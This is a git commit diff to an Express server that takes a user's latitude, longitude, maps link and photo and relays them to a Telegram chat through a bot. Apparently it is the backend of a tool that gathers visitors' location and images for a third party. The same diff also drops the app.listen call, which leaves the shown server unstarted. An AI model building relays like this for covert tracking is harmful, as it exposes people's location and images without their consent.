8007061c3723b84fca2b934100494139bf6ee1ad
Cauê Antunes <81662122+caue-siqueira@users.noreply.github.com>
2025-04-21 03:05:10 -0300

    Update server.js

--- server.js
+++ server.js
@@ -11,25 +11,27 @@ app.use(bodyParser.json());
 const TELEGRAM_BOT_TOKEN = "BOT-TOKEN"; // Substitua pelo token do seu bot
 const TELEGRAM_CHAT_ID = "CHAT-TOKEN"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
 
-app.post("/send-location", async (req, res) => {
-  const { latitude, longitude, maps } = req.body;
+app.post("/send-location-with-photo", async (req, res) => {
+  const { latitude, longitude, maps, foto } = req.body;
 
   const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
 
   try {
     // Envia a localização para o Telegram
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const sendMessage = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
+    });
+
+    // Envia a foto para o Telegram
+    const sendPhoto = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      photo: foto,
     });
 
     res.status(200).json({ success: true });
   } catch (error) {
     console.log(error);
-    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
+    res.status(500).json({ success: false, message: "Erro ao enviar a localização e foto para o Telegram." });
   }
-});
-
-app.listen(8088, () => {
-  console.log("Servidor rodando na porta 8088");
 });
